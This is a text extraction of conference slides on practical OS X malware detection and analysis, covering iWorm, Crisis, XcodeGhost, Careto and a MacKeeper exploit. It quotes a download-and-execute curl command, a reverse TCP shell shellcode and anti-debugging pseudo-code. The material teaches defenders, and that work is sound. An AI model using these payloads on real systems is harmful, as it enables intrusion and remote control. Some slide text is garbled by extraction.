SESSION ID: HTA-W03F
Let's Play Doctor
Practical OS X Malware Detection & Analysis

Patrick Wardle
Director of Research at Synack @patrickwardle

WHOIS
security for the "leverages the best combination of humans an2d1tsetchcneonlotguyryto
discover security vulnerabilities in our customers' web apps, mobile apps, IoT devices and infrastructure endpoints"
care ehrob @patrickwardle by

OUTLINE
steps to a happier, healthier 2016

outbreaks

virology

diagnostics

analysis

}
health & happiness
thanks & @thomascarreedeidt
@claud_xiao @osxreverser

PART 0X1: OUTBREAKS
overview of recent OS X malware specimens

MALWARE ON OS X
yes; it exists and is getting more prevalent

"It doesn't get PC viruses. A Mac isn't susceptible to the thousands of viruses plaguing Windows-based computers." apple.com (2012)

2014: "nearly 1000 unique attacks on Macs; 25 major families"
-kasperksy

2015: OS X most vulnerable software by CVE count
-cve details

2015: "The most prolific year in history for OS X malware...5x more OS X malware appeared in 2015 than during the previous five years combined" 

OS X/IWORM
`standard' backdoor, providing survey, download/execute,

infected torrents

launch daemon plist

# fs_usage -w -f filesys 20:28:28.727871 open /Library/LaunchDaemons/com.JavaW.plist 20:28:28.727890 write B=0x16b
persisting

launch daemon

survey

download

execute

OS X/CRISIS (RCSMAC)
hackingteam's implant; collect all things!

persistence (leaked source code)

launch agent

rootkit component

intelligence collection

"HackingTeam Reborn;  Analysis of an RCS Implant Installer"

OS X/XCODEGHOST
application infector

infected :(

compile

app store

source

infected app

app installed

$ less Xcode.app/Contents/PlugIns/Xcode3Core.ideplugin/Contents/SharedSupport/Developer/Library/Xcode/Plug-ins/

CoreBuildTasks.xcplugin/Contents/Resources/Ld.xcspec

...

Name = ALL_OTHER_LDFLAGS;

DefaultValue = "$(LD_FLAGS) $(SECTORDER_FLAGS) $(OTHER_LDFLAGS) $(OTHER_LDFLAGS_$(variant)) $ (OTHER_LDFLAGS_$(arch)) $(OTHER_LDFLAGS_$(variant)_$(arch)) $(PRODUCT_SPECIFIC_LDFLAGS)  -force_load $(PLATFORM_DEVELOPER_SDK_DIR)/Library/Frameworks/CoreServices.framework/CoreServices";

modified LD.xcspec file

OS X/GENIEO (INKEEPR)
most prolific os x adware
fake installers
bundled with apps

}

browser extension(s)
AD s

OS X/BACKDOOR(?)
bot/backdoor that exploits MacKeeper

"[a] flaw in MacKeeper's URL handler implementation allows arbitrary remote code execution when a user visits a specially crafted webpage" -bae systems

exploit &

<script> window.location.href = 'com-zeobit-command:///i/ZBAppController/performActionWithHelperTask:

payload

arguments:/<BASE_64_ENCODED_STUB>';

...

curl -A 'Safari' -o /Users/Shared/dufh

http://<redacted>/123/test/qapucin/bieber/210410/cormac.mcr;

chmod 755 /Users/Shared/dufh;

cd /Users/Shared;

./dufh

launch agent

survey shell download execute

OS X/CARETO ('MASK')
`cyber-espionage backdoor'

encoded strings

lea mov call ... mov mov call

rdi, encodedServer ; "\x16d\n~\x1AcM!"... rsi, decodedServer __Dcd

phishing/exploits

rdi, decodedServer esi, cs:_port _sbd_connect
disassembly
launch agent

$ lldb OSX_Careto (lldb) target create "OSX_Careto" Current executable set to 'OSX_Careto' (x86_64).''  (lldb) b _Dcd Breakpoint 1: where = OSX_Careto`_Dcd,
...
$ (lldb) x/s decodedServer 0x100102b40: "itunes212.appleupdt.com"

[~/Library/LaunchAgents/ com.apple.launchport.plist]

debugging (decoding C&C)

PART 0X2: VIROLOGY
study of os x malware characteristics & commonalities

INFECTION VECTORS
method 0x1: via user-interaction

rogue "AV" products

???

fake installers/updates

poor naive users

fake codecs

infected torrents

INFECTION VECTORS
method 0x2: exploits
}"interested in buying zero-day vulnerabilities with RCE exploits for the latest
versions of ...Safari? ...exploits allow to embed and remote execute custom payloads and demonstrate modern [exploitation] techniques on OS X"  -V. Toropov (email to hackingteam)
;OSX x64 reverse tcp shell (131 bytes, shell-storm.org) ;"\x41\xB0\x02\x49\xC1\xE0\x18\x49\x83\xC8\x61\x4C\x89\xC0\x48" + ;"\x31\xD2\x48\x89\xD6\x48\xFF\xC6\x48\x89\xF7\x48\xFF\xC7\x0F" + ;"\x05\x49\x89\xC4\x49\xBD\x01\x01\x11\x5C\xFF\xFF\xFF\xFF\x41" + ;"\xB1\xFF\x4D\x29\xCD\x41\x55\x49\x89\xE5\x49\xFF\xC0\x4C\x89" + ;"\xC0\x4C\x89\xE7\x4C\x89\xEE\x48\x83\xC2\x10\x0F\x05\x49\x83" + ;"\xE8\x08\x48\x31\xF6\x4C\x89\xC0\x4C\x89\xE7\x0F\x05\x48\x83" + ;"\xFE\x02\x48\xFF\xC6\x76\xEF\x49\x83\xE8\x1F\x4C\x89\xC0\x48" + ;"\x31\xD2\x49\xBD\xFF\x2F\x62\x69\x6E\x2F\x73\x68\x49\xC1\xED" + ;"\x08\x41\x55\x48\x89\xE7\x48\x31\xF6\x0F\x05"
how the real hackers do it

PERSISTENCE
many options, few used

launch daemons & agents browser extensions & plugins

user login items
~20 techniques
[RSA 2015] 
"Malware Persistence on OS X"

FEATURES
dependent on the goals of the malware

[ criminal ]

[ espionage ]

ads

shell

keylogs

clicks

surveys downloads

video

money

exec's

audio

SUMMARY
the current state of OS X malware

 trojans/phishcinrigme  some exploits infection

espionage  'hide' in plain site  rootkits? not common
stealth

 well known methods  majority: launch items persistence

 poorly implemented  suffice for the job
features

 minimal obfuscation  trivial to detect/remove
self-defense

 occasional anti-AV  no psp detection
psp bypass

PART 0X3: DIAGNOSTICS
are you infected?

VISUALLY OBSERVABLE INDICATORS
more often than not, you're not infected...

unlikely malware

most not trivially possibly malwaorebservable!

"my computer is so slow" "it keeps crashing"

AD "there are tons of popups" s "my homepage and search
engine are weird"

"so many processes"

"my computer says its infected

VISUALLY OBSERVABLE INDICATORS
generic alerts may indicate the presence of malware

persistence (BlockBlock)

network access (LittleSnitch)

note: such tools do not attempt to directly detect malware perse...

STEP 0X1: KNOWN MALWARE
any known malware running on your system?
VT ratios
TaskExplorer ( +virus total integration)

STEP 0X2: SUSPICIOUS PROCESSES
any unrecognized binaries running on your system?
"global search" for:

suspic ious!
unsigned
unrec+ognized (by VT) "a+pple"

unsigned tasks 3rd-party tasks

STEP 0X3: SUSPICIOUS PERSISTENCE
any unrecognized binaries persisting on your system?
suspic ious!
unsigned
un+recognized (by VT "a+pple"

KnockKnock; enum. persistence

a suspicious launch

STEP 0X4: NETWORK I/O
odd ports or unrecognized connections?

or 'established' for connected sessions

iWorm ('JavaW') listening for attacker connection
# sudo lsof -i | grep ESTABLISHED

apsd 75

root TCP 172.16.44.128:49508->17.143.164.32:5223 (ESTABLISHED)

apsd 75

root TCP 172.16.44.128:49508->17.143.164.32:5223 (ESTABLISHED)

com.apple 1168 user TCP 172.16.44.128:49511->bd044252.virtua.com.br:https (ESTABLISHED)

JavaW 1184 root TCP 172.16.44.128:49532->188.167.254.92:51667 (ESTABLISHED)

iWorm connected to c&c server

STEP 0X5: SUSPICIOUS KEXTS, HIJACKED
countless other things to look for....
uncheck `'Show OS Kexts'
any suspicious kernel extensions? hijacked dylibs?
[DefCon 2015]
"DLL Hijacking on OS X? #@%& Yeah!"

PART 0X4: ANALYSIS
determine if something is malicious....or not!?

CODE-SIGNING
examine the binary's code signature

libtidy dylib flagged by VT

signed by apple: not malware!
$ codesign -dvv /usr/lib/libtidy.A.dylib  Format=Mach-O universal (i386 x86_64)
Authority=Software Signing Authority=Apple Code Signing Certification Authority Authority=Apple Root CA

use codesign to display a binary's signing info
ex: $ codesign -dvv <file>

libtidy is signed by apple proper
codesign -dvv OSX_Careto  OSX_Careto: code object is not signed at all
most malware; unsigned

GOOGLE THE HASH
may (quickly) tell you; known good || known bad
$ md5 appleUpdater MD5 (appleUpdater) = 2b30e1f13a648cc40c1abb1148cf5088
unknown hash ....might be odd

known hash (OSX/Careto)

 3rd-party binaries, may produce zero hits on google
 0% detection on virustotal doesn't mean 100% not malware

STRINGS
quickly triage a binary's functionality

$ strings -a OSX_Careto
reverse lookup of %s failed: %s bind(): %s connecting to %s (%s) [%s] on port %u executing: %s
cM!M> `W9_c [0;32m
strings; OSX/Careto

networking & exec logic
encoded strings

$ strings -a JavaW  $Info: This file is packed with the UPX executable packer $Id: UPX 3.91 Copyright (C) 1996-2013 the UPX Team.
strings; iWorm

use with the -a flag google interesting strings
packed (UPX)

FILE ATTRIBUTES
OS X natively support encrypted binaries
disassembling Finder.app
$ strings -a myMalware infectUser: ALOHA RSA! $ ./protect myMalware encrypted 'myMalware' $ strings -a myMalware  n^jd[P5{Q r_`EYFaJq07
encrypting the malware

encrypted with Blowfish
ourhardworkbythese wordsguardedplease dontsteal(c)AppleC
known malware: ~50% drop VT detection

FILE ATTRIBUTES
detecting encrypted binaries
//check all load commands for(int i = 0; i<[machoHeader[LOAD_CMDS] count]; i++) {
//grab load command loadCommand = [machoHeader[LOAD_CMDS] pointerAtIndex:i]; //check text segment if(0 == strncmp(loadCommand->segname, SEG_TEXT, sizeof(loadCommand->segname)) {
//check if segment is protected if(SG_PROTECTED_VERSION_1 == (loadCommand->flags & SG_PROTECTED_VERSION_1)) {
//FILE IS ENCRYPTED
detecting encryption
} unsigned +
encrypted

TaskExpl orer

FILE ATTRIBUTES
malware is often packed to 'hinder' detection/analysis

$ strings -a JavaW  Info: This file is packed with the UPX executable packer http://upx.sf.net Id: UPX 3.09 Copyright (C) 1996-2013 the UPX Team. All Rights Reserved.
iWorm (JavaW); packed
//count all occurrences for(NSUInteger i = 0; i < length; i++)
occurrences[0xFF & (int)data[i]]++;
//calc entropy for(NSUInteger i = 0; 
i < sizeof(occurrences)/sizeof(occurrences[0]); i++) {
//add occurrences to entropy if(0 != occurrences[i]) {
//calc ratio pX = occurrences[i]/(float)length;
//cumulative entropy entropy -= pX*log2(pX); }
generic packer detection

TaskExpl orer
view all packed tasks/dylibs

CLASSDUMP
extract class names, methods, & more...

$ class-dump RCSMac.app  @interface __m_MCore : NSObject {
NSString *mBinaryName; NSString *mSpoofedName; }
- (BOOL)getRootThroughSLI; - (BOOL)isCrisisHookApp:(id)arg1; - (BOOL)makeBackdoorResident; - (void)renameBackdoorAndRelaunch;
@end
RCSMac (osx/crisis)

$ class-dump Installer.app  @interface ICDownloader : 
NSObject <NSURLConnectionDelegate> {
NSURL *_URL; NSString *_destPath; long long _httpStatusCode; NSString *_suggestedName; }
- (void)startDownloading;
@interface NSURL (ICEncryptedFileURLProtocol) + (id)fileURLWithURL:(id)arg1; + (id)encryptedFileURLWithURL:(id)arg1;
@end
adware installer (InstallCore)

http://stevenygard.com/projects/class-dump/

DYNAMIC FILE I/O
quickly determine binaries file-related actions

$ man fs_usage FS_USAGE(1)

BSD General Commands Manual

fs_usage -- report system calls and page faults related to filesystem activity in real-time

fs_usage manpage

# fs_usage -w -f filesystem

open /Users/user/Library/LaunchAgents/com.apple.updater.plist

write F=2 B=0x4a





 open F=5

/Users/Shared/dufh

... chmod <rwxr-xr-x> /Users/Shared/dufh

 unlink

./mackeeperExploiter

file i/o (mackeeper exploiter)

persistence as launch agent (com.apple.updater.plist)
installation (/Users/ Shared/dufh)
self deletion, cleanup

NETWORK I/O
gain insight into the binary's network communications
note: C&C is (now) offline
"itunes212.appleupdt.com"
osx/careto in wireshark

odd dns queries

periodic beacons

(custom) encrypted traffic

VIRUSTOTAL SANDBOX
file i/o + network i/o, and more!

virus total portal file i/o (iWorm)

network i/o (iWorm)
"VirusTotal += Mac OS X execution"

blog.virustotal.com/2015/11/ virustotal-mac-os-x-execution.html

REVERSING OBJECTIVE-C
understand

connectedToInternet(void) proc near

mov mov lea mov call ...

rdi, cs:_OBJC_CLASS_$_NSURL rsi, cs:URLWithString ; "URLWithString:" rdx, cfstr_google ; "www.google.com" rax, cs:_objc_msgSend_ptr rax ; objc_msgSend

internet check (mackeeper exploiter)

arg name (for) objc_msgSend

0

RDI class

1

RSI method name

2

RDX 1st argument

3

RCX 2nd argument

4

R8 3rd argument

5

R9 4th argument

calling convention (system v amd64 abi)

objc_msgSend function

DECOMPILATION
there's an app for that!

connectedToInternet(void) proc near

mov mov lea mov call ...

rdi, cs:_OBJC_CLASS_$_NSURL rsi, cs:URLWithString_ rdx, cfstr_google ; "www.google.com" rax, cs:_objc_msgSend_ptr rax

hopper.app http://www.hopperapp.com

int connectedToInternet() {
rax = [NSURL URLWithString:@"http://www.google.com"]; rdx = rax;

var_38 = [NSData dataWithContentsOfURL:rdx]; if(var_38 != 0x0) {
var_1 = 0x1; } else {
var_1 = 0x0; } rax = var_1 & 0x1 & 0xff; return rax; }

decompilation; internet check (mackeeper exploiter)

DEBUGGING
using lldb; os x's debugger

$ lldb newMalware (lldb) target create "/Users/patrick/malware/newMalware" Current executable set to '/Users/patrick/malware/newMalware' (x86_64).

beginning a debugging session

see: "Gdb to LLDB Command

command r

description launch (run) the process

Map"

example

b

breakpoint on function

b system

br s -a <addr> breakpoint on a memory add br s -a 0x10001337

si/ni

step into/step over

po

print objective-C object

po $rax

reg read

print all registers

common lldb commands

DEBUGGING DETECTION
os x anti-debugging techniques

call mov mov lea lea lea mov xor xor call mov test jz mov call

_getpid [rbp+var_34], eax [rbp+var_2D0], 288h rdi, [rbp+var_40] rdx, [rbp+var_2C8] rcx, [rbp+var_2D0] esi, 4 r8d, r8d r9d, r9d _sysctl eax, [rbp+var_2A8] ah, 8 short notDebugged rdi, [rbx] _remove

anti-debug (mackeeper exploiter)

process flags (debugged)

"Analyzing the Anti-Analysis Logic, of an Adware Installer"
//debugger flag #define P_TRACED 0x00000800
//management info base (`mib') mib[0] = CTL_KERN; mib[1] = KERN_PROC; mib[2] = KERN_PROC_PID; mib[3] = getpid();
//get process info sysctl(mib, sizeof(mib)/sizeof(*mib), &info, &size, NULL, 0);
//check flags to determine if debugged if(P_TRACED == (info.kp_proc.p_flag & P_TRACED)) {
//process is debugged!
//self delete remove(path2Self); }
anti-debug pseudo-code

ENABLING KERNEL DEBUGGING
for analyzing kernel extensions and rootkit components

disable SIP (in recovery mode; +r)

start debugger (lldb)

# lldb (lldb) target create /Library/Developer/KDKs/ KDK_10.11.1_15B42_.kdk/System/Library/Kernels/kernel

enable debugging
# nvram boot-args="debug=0x141 pmuflags=1 -v"
install appropriate `kernel debug kit'

connect and debug
(lldb) kdp-remote <VM IP addr> Version: Darwin Kernel Version 15.0.0: Wed Aug 26 16:57:32 PDT 2015; root:xnu-3247.1.106~1/RELEASE_X86_64;   (lldb) image list [ 0] 37BC582F-8BF4-3F65-AFBB-ECF792060C68 0xffffff8007000000 /Library/Developer/KDKs/ KDK_10.11_15A284.kdk/System/Library/Kernels/kernel

"Kernel Debugging a Virtualized  OS X Image"

PART 0X5: HEALTH & HAPPINESS
how do i protect my personal macs?

APPLE'S OS X SECURITY MITIGATIONS?
gatekeeper, xprotect, SIP, code-signing, et al...

"Security & privacy are fundamental to the design of all our hardware, software, and services" -tim cook

 "Gatekeeper Exposed"
(Shmoocon)

 "Writing Bad@ss OS X Malware" 
(Blackhat)

 "Attacking the XNU Kernel in El Capitan"
(BlackHat)
 "OS X El Capitan-Sinking the S/h\IP"  "Memory Corruption is for Wussies!"
(SysScan)

DEMO(GATEKEEPER BYPASS)

fully patched OS X

only 4 launch items

gatekeeper enabled

no 'java' processes

OS X LOCKDOWN
hardens OS X & reduces its attack surface
github.com/SummitRoute/osxlockdown
# ./osxlockdown [PASSED] Enable Auto Update [PASSED] Disable Bluetooth [PASSED] Disable infrared receiver [PASSED] Disable AirDrop ...  osxlockdown 0.9 Final Score 86%; Pass rate: 26/30
osxlockdown
S. Piper (@0xdabbad00)
"built to audit & remediate, security configuration settings on OS X 10.11" -S. Piper

OS X SECURITY TOOL
LittleSnitch Firewall

'snitching

trivial to bypass
yes, stay securitytuvunlneeradb!ilities?

"if [LittleSnitch] is found, the malware [OSX/DevilRobber.A] will skip installation and proceed to execute the clean software" fSecure.com

MY PERSONAL SECURITY TOOLS
Objective-See, because "sharing is caring" :)

+

I should write some OS X security tools to protect

my Mac

...as they try .t.o..saenldl share 'ethminfgrese! ly :)
"No one is going to provide you a quality service for

nothing. 

If you're not paying, you're the product." -fSecure

SECURITY TOOLS
Objective-See
TaskExplorer

specimens to play with!
Hijack Scanner

KnockKnock BlockBlock KextViewr

Ostiarius

Lockdown

CONCLUSIONS
wrapping this all up...

CONCLUSIONS & APPLICATION

learned about:

scan & protect!

os x malware (iWorm, Crisis, Genieo, etc.)
generic detection & analysis

little snitch/firewall

patrick@synack.co m
@patrickwardle

'focus on session' today @ 2:10 PM, west room

credits

- iconmonstr.com - http://wirdou.com/2012/02/04/is-that-bad-doctor/

images 

resources

- thesafemac.com - "Mac OS X & iOS Internals", Jonathan Levin - http://researchcenter.paloaltonetworks.com/2015/09/more-details-on-the-xcodeghost-malware-
and-affected-ios-apps/ - http://baesystemsai.blogspot.ch/2015/06/new-mac-os-malware-exploits-mackeeper.html - http://kasperskycontenthub.com/wp-content/uploads/sites/43/vlpdfs/unveilingthemask_v1.0.pdf

